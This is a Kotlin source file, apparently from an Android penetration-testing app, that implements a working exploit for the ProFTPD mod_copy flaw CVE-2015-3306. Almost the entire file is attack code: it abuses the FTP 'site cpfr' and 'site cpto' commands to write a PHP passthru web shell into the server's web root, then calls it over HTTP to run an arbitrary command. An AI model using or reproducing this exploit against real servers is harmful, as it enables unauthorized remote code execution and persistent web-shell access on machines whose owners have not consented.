package me.smoothhacker.swampsploit.exploit

import android.util.Log
import me.smoothhacker.swampsploit.util.InternetAddress
import me.smoothhacker.swampsploit.util.Path
import me.smoothhacker.swampsploit.util.Period
import me.smoothhacker.swampsploit.util.Port
import java.io.BufferedInputStream
import java.io.IOException
import java.io.InputStream
import java.io.PrintWriter
import java.net.*
import java.util.*
import kotlin.random.asKotlinRandom

class ProFTPD : Exploit() {
    override val cve = CVE(2015, 3306)
    val tag = cve.toString() // for now

    override val parameters = hashMapOf(
        "IP Address" to InternetAddress(),
        "Port" to Port(21),
        "Timeout" to Period(1000),
        "Temp Path" to Path("/tmp"),
        "Site Path" to Path("/var/www/html"),
    )

    var payload: Payload = Payload("touch PoCFile")

    private val random = Random().asKotlinRandom()

    private fun randomAlphanumeric(length: Int): String {
        val alphanumeric = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
        return String(Array(length) { alphanumeric[random.nextInt(alphanumeric.length)] }.toCharArray())
    }

    override fun exploit() {
        if (!ready) throw java.lang.Exception("Exploit is missing required parameters.")
        return exploit(
            parameters["IP Address"]!!.value as InetAddress,
            parameters["Port"]!!.value as Int,
            parameters["Timeout"]!!.value as Int,
            parameters["Temp Path"]!!.value as String,
            parameters["Site Path"]!!.value as String,
        )
    }

    private fun exploit(address: InetAddress, port: Int, timeout: Int, tempPath: String, sitePath: String) {
        val get = randomAlphanumeric(5 + random.nextInt(3))
        val payloadName = randomAlphanumeric(5 + random.nextInt(3)) + ".php"

        val client = Socket()
        client.soTimeout = timeout

        try {
            client.connect(InetSocketAddress(address, port))
        } catch (e: IOException) {
            Log.w(tag, "$address:$port - Failed to establish connection.")
            return
        }

        val input = client.getInputStream()
        val reader = input.bufferedReader()
        val writer = PrintWriter(client.getOutputStream(), true)

        try {
            if (!reader.readLine().contains("220")) {
                throw SocketTimeoutException();
            }
        } catch (e: SocketTimeoutException) {
            Log.w(tag, "$address:$port - Failed to retrieve 220 status.")
            return
        }

        writer.println("site cpfr /proc/self/cmdline")
        var result = reader.readLine()
        try {
            if (!result.contains("350")) {
                throw SocketTimeoutException();
            }
        } catch (e: SocketTimeoutException) {
            Log.w(tag, "$address:$port - Failed copying from '/proc/self/cmdline'.")
            return
        }

        writer.println("site cpto $tempPath/.<?php passthru(\$_GET['$get']);?>")
        result = reader.readLine()
        try {
            if (!result.contains("250")) {
                throw SocketTimeoutException();
            }
        } catch (e: SocketTimeoutException) {
            Log.w(tag, "$address:$port - Failed copying to '$tempPath'.")
            return
        }

        writer.println("site cpfr $tempPath/.<?php passthru(\$_GET['$get']);?>")
        result = reader.readLine()
        try {
            if (!result.contains("350")) {
                throw SocketTimeoutException();
            }
        } catch (e: SocketTimeoutException) {
            Log.w(tag, "$address:$port - Failed copying from '$tempPath'.")
            return
        }

        writer.println("site cpto $sitePath/$payloadName")
        result = reader.readLine()
        try {
            if (!result.contains("250")) {
                throw SocketTimeoutException();
            }
        } catch (e: SocketTimeoutException) {
            Log.w(tag, "$address:$port - Failed copying PHP payload to '$sitePath/$payloadName'.")
            return
        }

        val url = URL("http://$address/$payloadName?$get=${URLEncoder.encode("nohup $payload &")}")
        val urlConnection = url.openConnection() as HttpURLConnection
        try {
            val x: InputStream = BufferedInputStream(urlConnection.inputStream)
            x.reader().readLines().forEach { Log.w(tag, it) }
        } finally {
            urlConnection.disconnect()
        }

        client.close()
    }
}
